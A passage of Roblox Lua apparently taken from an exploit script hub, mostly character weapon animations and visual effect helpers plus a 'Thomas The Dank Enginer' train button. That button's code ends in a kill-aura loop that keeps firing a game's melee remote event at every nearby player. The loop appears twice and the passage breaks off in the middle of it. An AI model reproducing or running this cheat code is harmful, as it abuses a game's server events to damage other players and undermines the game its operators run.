                --while Targetting==true and Humanoid.Health>0 and Character.Parent~=nil do
                if Humanoid.Health>0 and Character.Parent~=nil and TargHum.Health>0 and TargHum.Parent~=nil and Targetting==true then
                swait()
                end
                --workspace.CurrentCamera.CoordinateFrame=CFrame.new(Head.CFrame.p,Head.CFrame.p+rmdir*100)
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                dir=Vector3.new(cam.CoordinateFrame.lookVector.x,0,cam.CoordinateFrame.lookVector.z)
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)*cf(0,5,10)*euler(-0.3,0,0)
                end
                Targetting=false
                RocketTarget=nil
                targetgui.Parent=nil
                cam.CameraType="Custom"
                end
                end
                        debounce=Instance.new("BoolValue")
                        debounce.Name="DebounceHit"
                        debounce.Parent=hit.Parent
                        debounce.Value=true
                        game:GetService("Debris"):AddItem(debounce,Delay)
                        c=Instance.new("ObjectValue")
                        c.Name="creator"
                        c.Value=Player
                        c.Parent=h
                        game:GetService("Debris"):AddItem(c,.5)
                CRIT=false
                hitDeb=true
                AttackPos=6
        end
end
 
showDamage=function(Char,Dealt,du,Color)
        m=Instance.new("Model")
        m.Name=tostring(Dealt)
        h=Instance.new("Humanoid")
        h.Health=0
        h.MaxHealth=0
        h.Parent=m
        c=Instance.new("Part")
        c.Transparency=0
        c.BrickColor=Color
        c.Name="Head"
        c.TopSurface=0
        c.BottomSurface=0
        c.formFactor="Plate"
        c.Size=Vector3.new(1,.4,1)
        ms=Instance.new("CylinderMesh")
        ms.Scale=Vector3.new(.8,.8,.8)
        if CRIT==true then
                ms.Scale=Vector3.new(1,1.25,1)
        end
        ms.Parent=c
        c.Reflectance=0
        Instance.new("BodyGyro").Parent=c
        c.Parent=m
        if Char:findFirstChild("Head")~=nil then
        c.CFrame=CFrame.new(Char["Head"].CFrame.p+Vector3.new(0,1.5,0))
        elseif Char.Parent:findFirstChild("Head")~=nil then
        c.CFrame=CFrame.new(Char.Parent["Head"].CFrame.p+Vector3.new(0,1.5,0))
        end
        f=Instance.new("BodyPosition")
        f.P=2000
        f.D=100
        f.maxForce=Vector3.new(math.huge,math.huge,math.huge)
        f.position=c.Position+Vector3.new(0,3,0)
        f.Parent=c
        game:GetService("Debris"):AddItem(m,.5+du)
        c.CanCollide=false
        m.Parent=workspace
        c.CanCollide=false
end


function part(formfactor,parent,reflectance,transparency,brickcolor,name,size)
local fp=it("Part")
fp.formFactor=formfactor 
fp.Parent=parent
fp.Reflectance=reflectance
fp.Transparency=transparency
fp.CanCollide=false 
fp.Locked=true
fp.BrickColor=brickcolor
fp.Name=name
fp.Size=size
fp.Position=Torso.Position 
NoOutline(fp)
fp.Material="SmoothPlastic"
fp:BreakJoints()
return fp 
end 
 
function mesh(Mesh,part,meshtype,meshid,offset,scale)
local mesh=it(Mesh) 
mesh.Parent=part
if Mesh=="SpecialMesh" then
mesh.MeshType=meshtype
if meshid~="nil" then
mesh.MeshId="http://www.roblox.com/asset/?id="..meshid
end
end
mesh.Offset=offset
mesh.Scale=scale
return mesh
end
 
function weld(parent,part0,part1,c0)
local weld=it("Weld") 
weld.Parent=parent
weld.Part0=part0 
weld.Part1=part1 
weld.C0=c0
return weld
end
 
local Color1=Torso.BrickColor

local bodvel=Instance.new("BodyVelocity")
local bg=Instance.new("BodyGyro")

function swait(num)
if num==0 or num==nil then
game:service'RunService'.Stepped:wait(0)
else
for i=0,num do
game:service'RunService'.Stepped:wait(0)
end
end
end
 
 
so = function(id,par,vol,pit) 
coroutine.resume(coroutine.create(function()
local sou = Instance.new("Sound",par or workspace)
sou.Volume=vol
sou.Pitch=pit or 1
sou.SoundId=id
swait() 
sou:play() 
game:GetService("Debris"):AddItem(sou,6)
end))
end
 
function clerp(a,b,t) 
local qa = {QuaternionFromCFrame(a)}
local qb = {QuaternionFromCFrame(b)} 
local ax, ay, az = a.x, a.y, a.z 
local bx, by, bz = b.x, b.y, b.z
local _t = 1-t
return QuaternionToCFrame(_t*ax + t*bx, _t*ay + t*by, _t*az + t*bz,QuaternionSlerp(qa, qb, t)) 
end 
 
function QuaternionFromCFrame(cf) 
local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components() 
local trace = m00 + m11 + m22 
if trace > 0 then 
local s = math.sqrt(1 + trace) 
local recip = 0.5/s 
return (m21-m12)*recip, (m02-m20)*recip, (m10-m01)*recip, s*0.5 
else 
local i = 0 
if m11 > m00 then
i = 1
end
if m22 > (i == 0 and m00 or m11) then 
i = 2 
end 
if i == 0 then 
local s = math.sqrt(m00-m11-m22+1) 
local recip = 0.5/s 
return 0.5*s, (m10+m01)*recip, (m20+m02)*recip, (m21-m12)*recip 
elseif i == 1 then 
local s = math.sqrt(m11-m22-m00+1) 
local recip = 0.5/s 
return (m01+m10)*recip, 0.5*s, (m21+m12)*recip, (m02-m20)*recip 
elseif i == 2 then 
local s = math.sqrt(m22-m00-m11+1) 
local recip = 0.5/s return (m02+m20)*recip, (m12+m21)*recip, 0.5*s, (m10-m01)*recip 
end 
end 
end
 
function QuaternionToCFrame(px, py, pz, x, y, z, w) 
local xs, ys, zs = x + x, y + y, z + z 
local wx, wy, wz = w*xs, w*ys, w*zs 
local xx = x*xs 
local xy = x*ys 
local xz = x*zs 
local yy = y*ys 
local yz = y*zs 
local zz = z*zs 
return CFrame.new(px, py, pz,1-(yy+zz), xy - wz, xz + wy,xy + wz, 1-(xx+zz), yz - wx, xz - wy, yz + wx, 1-(xx+yy)) 
end
 
function QuaternionSlerp(a, b, t) 
local cosTheta = a[1]*b[1] + a[2]*b[2] + a[3]*b[3] + a[4]*b[4] 
local startInterp, finishInterp; 
if cosTheta >= 0.0001 then 
if (1 - cosTheta) > 0.0001 then 
local theta = math.acos(cosTheta) 
local invSinTheta = 1/math.sin(theta) 
startInterp = math.sin((1-t)*theta)*invSinTheta 
finishInterp = math.sin(t*theta)*invSinTheta  
else 
startInterp = 1-t 
finishInterp = t 
end 
else 
if (1+cosTheta) > 0.0001 then 
local theta = math.acos(-cosTheta) 
local invSinTheta = 1/math.sin(theta) 
startInterp = math.sin((t-1)*theta)*invSinTheta 
finishInterp = math.sin(t*theta)*invSinTheta 
else 
startInterp = t-1 
finishInterp = t 
end 
end 
return a[1]*startInterp + b[1]*finishInterp, a[2]*startInterp + b[2]*finishInterp, a[3]*startInterp + b[3]*finishInterp, a[4]*startInterp + b[4]*finishInterp 
end

function rayCast(Pos, Dir, Max, Ignore)  -- Origin Position , Direction, MaxDistance , IgnoreDescendants
return game:service("Workspace"):FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), Ignore) 
end 

function SkullEffect(brickcolor,cframe,x1,y1,z1,delay)
local prt=part(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
prt.Anchored=true
prt.CFrame=cframe
local msh=mesh("SpecialMesh",prt,"FileMesh","http://www.roblox.com/asset/?id=4770583",vt(0,0,0),vt(x1,y1,z1))
--http://www.roblox.com/asset/?id=4770560
game:GetService("Debris"):AddItem(prt,2)
CF=prt.CFrame
coroutine.resume(coroutine.create(function(Part,Mesh,TehCF) 
for i=0,1,0.2 do
wait()
Part.CFrame=CF*cf(0,0,-0.4)
end
for i=0,1,delay do
wait()
--Part.CFrame=CF*cf((math.random(-1,0)+math.random())/5,(math.random(-1,0)+math.random())/5,(math.random(-1,0)+math.random())/5)
Mesh.Scale=Mesh.Scale
end
for i=0,1,0.1 do
wait()
Part.Transparency=i
end
Part.Parent=nil
end),prt,msh,CF)
end
 
function MagicBlock(brickcolor,cframe,x1,y1,z1,x3,y3,z3,delay)
local prt=part(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
prt.Anchored=true
prt.CFrame=cframe
msh=mesh("BlockMesh",prt,"","",vt(0,0,0),vt(x1,y1,z1))
game:GetService("Debris"):AddItem(prt,5)
coroutine.resume(coroutine.create(function(Part,Mesh) 
for i=0,1,delay do
wait()
Part.CFrame=Part.CFrame*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))
Part.Transparency=i
Mesh.Scale=Mesh.Scale+vt(x3,y3,z3)
end
Part.Parent=nil
end),prt,msh)
end
 
function MagicBlock2(brickcolor,cframe,Parent,x1,y1,z1,x3,y3,z3,delay)
local prt=part(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
prt.Anchored=false
prt.CFrame=cframe
msh=mesh("BlockMesh",prt,"","",vt(0,0,0),vt(x1,y1,z1))
local wld=weld(prt,prt,Parent,cframe)
game:GetService("Debris"):AddItem(prt,5)
coroutine.resume(coroutine.create(function(Part,Mesh,Weld) 
for i=0,1,delay do
wait()
Weld.C0=euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))*cframe
--Part.CFrame=Part.CFrame*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))
Part.Transparency=i
Mesh.Scale=Mesh.Scale+vt(x3,y3,z3)
end
Part.Parent=nil
end),prt,msh,wld)
end
 
function MagicBlock3(brickcolor,cframe,Parent,x1,y1,z1,x3,y3,z3,delay)
local prt=part(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
prt.Anchored=false
prt.CFrame=cframe
msh=mesh("BlockMesh",prt,"","",vt(0,0,0),vt(x1,y1,z1))
local wld=weld(prt,prt,Parent,euler(0,0,0)*cf(0,0,0))
game:GetService("Debris"):AddItem(prt,5)
coroutine.resume(coroutine.create(function(Part,Mesh,Weld) 
for i=0,1,delay do
wait()
Weld.C0=euler(i*20,0,0)
--Part.CFrame=Part.CFrame*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))
Part.Transparency=i
Mesh.Scale=Mesh.Scale+vt(x3,y3,z3)
end
Part.Parent=nil
end),prt,msh,wld)
end
 
function MagicCircle2(brickcolor,cframe,x1,y1,z1,x3,y3,z3,delay)
local prt=part(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
prt.Anchored=true
prt.CFrame=cframe
local msh=mesh("CylinderMesh",prt,"","",vt(0,0,0),vt(x1,y1,z1))
game:GetService("Debris"):AddItem(prt,2)
coroutine.resume(coroutine.create(function(Part,Mesh) 
for i=0,1,delay do
wait()
Part.CFrame=Part.CFrame
Mesh.Scale=Mesh.Scale+vt(x3,y3,z3)
local prt2=part(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
prt2.Anchored=true
prt2.CFrame=cframe*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))
local msh2=mesh("SpecialMesh",prt2,"Sphere","",vt(0,0,0),vt(0.5,0.5,0.5))
game:GetService("Debris"):AddItem(prt2,2)
coroutine.resume(coroutine.create(function(Part,Mesh) 
for i=0,1,0.1 do
wait()
Part.CFrame=Part.CFrame*cf(0,0.5,0)
end
Part.Parent=nil
end),prt2,msh2)
end
for i=0,1,delay*2 do
wait()
Part.CFrame=Part.CFrame
Mesh.Scale=vt((x1+x3)-(x1+x3)*i,(y1+y3)-(y1+y3)*i,(z1+z3)-(z1+z3)*i)
end
Part.Parent=nil
end),prt,msh)
end
 
function MagicCircle(brickcolor,cframe,x1,y1,z1,x3,y3,z3,delay)
local prt=part(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
prt.Anchored=true
prt.CFrame=cframe
local msh=mesh("SpecialMesh",prt,"Sphere","",vt(0,0,0),vt(x1,y1,z1))
game:GetService("Debris"):AddItem(prt,2)
coroutine.resume(coroutine.create(function(Part,Mesh) 
for i=0,1,delay do
wait()
Part.CFrame=Part.CFrame
Part.Transparency=i
Mesh.Scale=Mesh.Scale+vt(x3,y3,z3)
end
Part.Parent=nil
end),prt,msh)
end
 
function MagicRing(brickcolor,cframe,x1,y1,z1,x2,y2,z2,x3,y3,z3)
local prt=part(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
prt.Anchored=true
prt.CFrame=cframe*euler(x2,y2,z2)
--"http://www.roblox.com/asset/?id=168892465"
local msh=mesh("SpecialMesh",prt,"FileMesh","http://www.roblox.com/asset/?id=3270017",vt(0,0,0),vt(x1,y1,z1))
game:GetService("Debris"):AddItem(prt,2)
coroutine.resume(coroutine.create(function(Part,Mesh) 
for i=0,1,0.03 do
wait()
Part.CFrame=Part.CFrame
Part.Transparency=i
Mesh.Scale=Mesh.Scale+vt(x3,y3,z3)
end
Part.Parent=nil
end),prt,msh)
end
 
function BreakEffect(brickcolor,cframe,x1,y1,z1)
local prt=part(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
prt.Anchored=true
prt.CFrame=cframe*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))
local msh=mesh("SpecialMesh",prt,"Sphere","",vt(0,0,0),vt(x1,y1,z1))
game:GetService("Debris"):AddItem(prt,2)
coroutine.resume(coroutine.create(function(Part,CF,Numbb,randnumb) 
CF=Part.CFrame
Numbb=0
randnumb=math.random()/10
rand1=math.random()/10
for i=0,1,rand1 do
wait()
CF=CF*cf(0,math.random()/2,0)
--Part.CFrame=Part.CFrame*euler(0.5,0,0)*cf(0,1,0)
Part.CFrame=CF*euler(Numbb,0,0)
Part.Transparency=i
Numbb=Numbb+randnumb
end
Part.Parent=nil
end),prt,CF,Numbb,randnumb)
end
 
function MagicWaveThing(brickcolor,cframe,x1,y1,z1,x3,y3,z3,delay)
local prt=part(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
prt.Anchored=true
prt.CFrame=cframe
msh=mesh("SpecialMesh",prt,"FileMesh","http://www.roblox.com/asset/?id=1051557",vt(0,0,0),vt(x1,y1,z1))
game:GetService("Debris"):AddItem(prt,5)
coroutine.resume(coroutine.create(function(Part,Mesh) 
for i=0,1,delay do
wait()
Part.CFrame=Part.CFrame*euler(0,0.7,0)
Part.Transparency=i
Mesh.Scale=Mesh.Scale+vt(x3,y3,z3)
end
Part.Parent=nil
end),prt,msh)
end
 
function WaveEffect(brickcolor,cframe,x1,y1,z1,x3,y3,z3,delay)
local prt=part(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
prt.Anchored=true
prt.CFrame=cframe
msh=mesh("SpecialMesh",prt,"FileMesh","http://www.roblox.com/asset/?id=20329976",vt(0,0,0),vt(x1,y1,z1))
game:GetService("Debris"):AddItem(prt,2)
coroutine.resume(coroutine.create(function(Part,Mesh) 
for i=0,1,delay do
wait()
Part.CFrame=Part.CFrame*cf(0,y3/2,0)
Part.Transparency=i
Mesh.Scale=Mesh.Scale+vt(x3,y3,z3)
end
Part.Parent=nil
end),prt,msh)
end
 
function StravEffect(brickcolor,cframe,x,y,z,x1,y1,z1,delay)
local prt=part(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
prt.Anchored=true
prt.CFrame=cframe*cf(x,y,z)
msh=mesh("SpecialMesh",prt,"FileMesh","rbxassetid://168892363",vt(0,0,0),vt(x1,y1,z1))
game:GetService("Debris"):AddItem(prt,5)
coroutine.resume(coroutine.create(function(Part,Mesh,ex,why,zee) 
local num=math.random()
local num2=math.random(-3,2)+math.random()
local numm=0
for i=0,1,delay*2 do
swait()
Part.CFrame=cframe*euler(0,numm*num*10,0)*cf(ex,why,zee)*cf(-i*10,num2,0)
Part.Transparency=i
numm=numm+0.01
end
Part.Parent=nil
Mesh.Parent=nil
end),prt,msh,x,y,z)
end

ring=function(way,way2,where,vector,rv1,rv2,rv3,c1,c2,color)
        local rng = Instance.new("Part", char.Torso)
        rng.Anchored = true
        rng.BrickColor = BrickColor.new(tostring(color))
        rng.CanCollide = false
        rng.FormFactor = 3
        rng.Name = "Ring"
        rng.Size = Vector3.new(1, 1, 1)
        rng.Transparency = .5
        rng.TopSurface = 0
        rng.BottomSurface = 0
        rng.CFrame = where * CFrame.Angles(math.rad(way), math.rad(way2), 0)
        local rngm = Instance.new("SpecialMesh", rng)
        rngm.MeshId = "http://www.roblox.com/asset/?id=3270017"
        rngm.Scale = vector--10,10,1
        for i = 1, 20, 1 do
                rngm.Scale = Vector3.new(rv1 + i*c1, rv2 + i*c2, rv3)--(10 + i*2, 10 + i*2, 1)
                rng.Transparency = i/20
                swait()
        end
        wait()
        rng:destroy''
end

mouse.Button1Down:connect(function()
        if attack==false then
                if attacktype==1 then
                        attack=true
                        attacktype=2
                        attackone()
                elseif attacktype==2 then
                        attack=true
                        attacktype=3
                        attacktwo()
                elseif attacktype==3 then
                        attack=true
                        attacktype=1
                        attackthree()
                end
        end
end)

function attackone()
        attack=true
con1=Hitbox.Touched:connect(function(hit) Damagefunc(hit,30,50,math.random(10,20),"Normal",RootPart,.2,1) end) 
        for i=0,1.5,0.1 do
swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(-60),math.rad(0),math.rad(20)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(35),math.rad(0),math.rad(0)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-25),math.rad(0),math.rad(0)),.3)
RH.C0=clerp(RH.C0,cf(1,-1,-.25)*angles(math.rad(0),math.rad(90),math.rad(20))*angles(math.rad(-5),math.rad(0),math.rad(15)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(-20))*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
handleweld.C0=clerp(handleweld.C0,cf(0,0,.4)*angles(math.rad(80),math.rad(-20),math.rad(0)),.3)
        end
so("http://roblox.com/asset/?id=189505639",Hitbox,1,1) 
 for i=0,1,0.1 do
swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(120),math.rad(0),math.rad(10)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(25),math.rad(0),math.rad(0)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-25),math.rad(0),math.rad(0)),.3)
RH.C0=clerp(RH.C0,cf(1,-1,-.25)*angles(math.rad(0),math.rad(90),math.rad(20))*angles(math.rad(-5),math.rad(0),math.rad(15)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(-20))*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
handleweld.C0=clerp(handleweld.C0,cf(0,-1,-1)*angles(math.rad(-80),math.rad(20),math.rad(0)),.3)
        end
attack=false
con1:disconnect()
end

function attacktwo()
con1=Hitbox.Touched:connect(function(hit) Damagefunc(hit,30,50,math.random(10,20),"Normal",RootPart,.2,1) end) 
        attack=true
        for i=0,1.5,0.1 do
swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(130),math.rad(0),math.rad(20)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(30),math.rad(0),math.rad(-40)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-25),math.rad(0),math.rad(0)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(-20))*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
--handleweld.C0=clerp(handleweld.C0,cf(0,0,.4)*angles(math.rad(80),math.rad(-20),math.rad(0)),.3)
        end
so("http://roblox.com/asset/?id=189505662",Hitbox,1,1) 
 for i=0,1,0.1 do
swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(10),math.rad(20),math.rad(-30)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(30),math.rad(0),math.rad(-40)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(10),math.rad(0),math.rad(0)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(-20))*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
handleweld.C0=clerp(handleweld.C0,cf(0,0,.4)*angles(math.rad(-40),math.rad(0),math.rad(0)),.3)
        end
attack=false
con1:disconnect()
end

function attackthree()
con1=Hitbox.Touched:connect(function(hit) Damagefunc(hit,30,50,math.random(10,20),"Normal",RootPart,.2,1) end) 
        attack=true
        for i=0,1.5,0.1 do
swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(130),math.rad(0),math.rad(10)),.3)
LW.C0=clerp(LW.C0,cf(-1,0.5,-0.5)*euler(math.rad(100),math.rad(15),math.rad(50)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-25),math.rad(0),math.rad(0)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(-20))*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
--handleweld.C0=clerp(handleweld.C0,cf(0,0,.4)*angles(math.rad(80),math.rad(-20),math.rad(0)),.3)
        end
so("http://roblox.com/asset/?id=189505649",Hitbox,1,1) 
 for i=0,1,0.1 do
swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(10),math.rad(20),math.rad(50)),.3)
LW.C0=clerp(LW.C0,cf(-1,0.5,-0.5)*euler(math.rad(100),math.rad(15),math.rad(50)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(10),math.rad(0),math.rad(0)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(-20))*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
handleweld.C0=clerp(handleweld.C0,cf(0,0,.4)*angles(math.rad(-40),math.rad(0),math.rad(0)),.3)
        end
attack=false
con1:disconnect()
end


local sine = 0
local change = 1
local val = 0

local mananum=0
while true do
swait()
sine = sine + change
local torvel=(RootPart.Velocity*Vector3.new(1,0,1)).magnitude 
local velderp=RootPart.Velocity.y
hitfloor,posfloor=rayCast(RootPart.Position,(CFrame.new(RootPart.Position,RootPart.Position - Vector3.new(0,1,0))).lookVector,4,Character)
if equipped==true or equipped==false then
if attack==false then
idle=idle+1
else
idle=0
end
if idle>=500 then
if attack==false then
--Sheath()
end
end
if RootPart.Velocity.y > 1 and hitfloor==nil then 
Anim="Jump"
if attack==false then
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(5),math.rad(0),math.rad(0)),.3)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(-60),math.rad(0),math.rad(50)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(50),math.rad(0),math.rad(-40)),.3)
RH.C0=clerp(RH.C0,cf(1,-1,-.25)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(0),math.rad(0),math.rad(15)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
handleweld.C0=clerp(handleweld.C0,cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
end
elseif RootPart.Velocity.y < -1 and hitfloor==nil then 
Anim="Fall"
if attack==false then
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(5),math.rad(0),math.rad(0)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(-50),math.rad(0),math.rad(40)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(40),math.rad(0),math.rad(-30)),.3)
RH.C0=clerp(RH.C0,cf(1,-1,-.25)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(0),math.rad(0),math.rad(15)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
handleweld.C0=clerp(handleweld.C0,cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
end
elseif torvel<1 and hitfloor~= nil then
local idleanim=0
Anim="Idle"
if attack==false then
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(-30),math.rad(0),math.rad(30)),.3)
LW.C0=clerp(LW.C0,cf(-1,0.5,-0.5)*euler(math.rad(100),math.rad(15),math.rad(50)),.3)
RH.C0=clerp(RH.C0,cf(1,-1,-.25)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(15)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
handleweld.C0=clerp(handleweld.C0,cf(0,0,0)*angles(math.rad(40),math.rad(-20),math.rad(0)),.3)
end
elseif torvel>2 and torvel<22 and hitfloor~=nil then
Anim="Walk"
if attack==false then
change=1
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(30),math.rad(0),math.rad(0)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-20),math.rad(0),math.rad(0)),.3)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(-50),math.rad(0),math.rad(30)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(30),math.rad(0),math.rad(-40)),.3)
handleweld.C0=clerp(handleweld.C0,cf(0,0,.3)*angles(math.rad(70),math.rad(-20),math.rad(0)),.3)
end
elseif torvel>=22 and hitfloor~=nil then
Anim="Run"
if attack==false then
end
end
end
end end
}
Tab:Button{
	Name = "Thomas The Dank Enginer",
	Description = nil,
	Callback = function() local p = game.Players.LocalPlayer.Character
local weld = Instance.new("Weld",p.Torso)
weld.Part0 = p.Torso

local train = Instance.new("Part",p.Torso)
train.Anchored = true
train.CanCollide = false
train.Size = Vector3.new(3,2,6)
train.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
weld.Part1 = train
weld.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,math.rad(180),0)
train.Anchored = false
local TrainMesh = Instance.new("SpecialMesh",train)
TrainMesh.MeshType = Enum.MeshType.FileMesh
TrainMesh.Scale = Vector3.new(0.020,0.020,0.015)
TrainMesh.MeshId = "rbxassetid://431017802"
TrainMesh.TextureId = "rbxassetid://431017809"


local weld2 = Instance.new("Weld",p.Torso)
weld2.Part0 = p.Torso
local Smoke = Instance.new("Part",p.Torso)
Smoke.Anchored = true
Smoke.CanCollide = false
Smoke.Size = Vector3.new(1,1,1)
Smoke.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
weld2.Part1 = Smoke
weld2.C1 = CFrame.new(0,-4,3.5)-- * CFrame.Angles(0,math.rad(180),0)
Smoke.Anchored = false
Smoke.Transparency = 1;

local Particle = Instance.new("ParticleEmitter",Smoke)
Particle.Rate = 100;
Particle.Speed = NumberRange.new(30,60);
Particle.VelocitySpread = 4;
Particle.Texture = "rbxassetid://133619974"

local Light = Instance.new("SpotLight",train)
Light.Angle = 45;
Light.Brightness = 100;
Light.Face = Enum.NormalId.Back;
Light.Range = 30;

p.Humanoid.WalkSpeed = 80;

for i,v in pairs(p:GetChildren()) do
	if v:IsA("Part") then
		v.Transparency = 1;
	elseif v:IsA("Hat") then
		v:Destroy()
	elseif v:IsA("Model") then
		v:Destroy()
	end
end


local function SFX(id) local s=Instance.new("Sound",p.Torso); s.SoundId = "rbxassetid://"..id; s.Volume = 1; return s; end
train.Touched:connect(function(p)
	if p.Parent then
		if p.Parent:IsA("Model") then
			if game.Players:FindFirstChild(p.Parent.Name) then
				if p.Parent.Name ~= game.Players.LocalPlayer.Name then
					game.Players:FindFirstChild(p.Parent.Name)
					local Whistle = SFX(475073913)
					Whistle:Play()
				end
			end
		end
	end
end)

local Music = SFX(190819252)
Music.Looped = true;
wait(1)
Music:Play();
-- ~CL 2016

wait(0.9)

local lplr = game.Players.LocalPlayer

local check = function(character : Model)
    if character and character:FindFirstChild("Humanoid") and character.Humanoid.Health ~= 0 and (lplr.Character.HumanoidRootPart.Position - character.HumanoidRootPart.Position).magnitude <= 9 then
        return true
    else
        return false
    end
end

while task.wait() do
    for i,v in pairs(game.Players:GetPlayers()) do
        if v ~= lplr and check(v.Character) then
            game:GetService("ReplicatedStorage").meleeEvent:FireServer(v)
        end
    end
end

wait(0.1)

local lplr = game.Players.LocalPlayer

local check = function(character : Model)
    if character and character:FindFirstChild("Humanoid") and character.Humanoid.Health ~= 0 and (lplr.Character.HumanoidRootPart.Position - character.HumanoidRootPart.Position).magnitude <= 9 then
        return true
    else
        return false
    end
end

while task.wait() do
    for i,v in pairs(game.Players:GetPlayers()) do
        if v ~= lplr and check(v.Character) then
